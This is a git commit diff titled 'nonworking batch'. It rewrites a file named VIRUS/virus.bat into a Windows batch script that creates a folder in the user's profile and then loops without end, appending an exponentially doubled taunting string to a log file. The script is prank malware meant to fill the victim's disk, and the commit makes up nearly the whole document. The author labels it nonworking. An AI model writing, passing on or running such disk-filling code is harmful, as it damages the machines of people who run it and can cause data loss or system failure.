0d9fd71378af5a6d0ac36116394f86a15cbdca89
fryball1443 <nwjensen42@tntech.edu>
2024-03-26 02:57:10 -0500

    nonworking batch

--- VIRUS/virus.bat
+++ VIRUS/virus.bat
@@ -1,2 +1,19 @@
 @echo off
-java -Xmx9999m App
+setlocal enabledelayedexpansion
+
+set "mainPath=%userprofile%\virus_prof"
+set "logPath=%userprofile%\virus_prof\log.txt"
+
+if not exist "%mainPath%" (
+    mkdir "%mainPath%"
+)
+
+:loop
+set "prankstr=hahahahaha get pranked idiot. "
+for /L %%i in (1, 1, 23) do (
+    set "prankstr=!prankstr!!prankstr!"
+)
+
+echo !prankstr! >> "%logPath%"
+goto loop
+virus.bat
